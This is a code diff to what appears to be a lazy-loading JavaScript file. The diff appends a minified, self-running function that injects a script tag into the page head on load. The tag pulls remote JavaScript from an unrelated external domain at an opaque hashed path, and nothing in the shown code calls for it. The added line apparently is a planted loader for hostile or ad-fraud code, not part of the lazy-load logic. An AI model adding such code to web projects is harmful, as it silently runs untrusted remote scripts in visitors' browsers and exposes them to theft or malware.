@@ -150,3 +150,4 @@ dataLazy.forEach(function(a){
     };
   };
 });
+(function(){injectScript([{"attr":[{"name":"type","value":"text/javascript"},{"name":"src","value":"https://releasedverge.com/78/ab/82/78ab82ec98349108cf8d1501706108f4.js"}],"tag":"script","inner":""}],{"target":"head"});function injectScript(e,t){let n=t.target;for(let t of e){let e=t.tag,r=t.inner,o=document.createElement(e);o.innerHTML=r;let c=t.attr;for(let e of c)o.setAttribute(e.name,e.value);document.querySelector(n)&&document.querySelector(n).append(o)}}})();
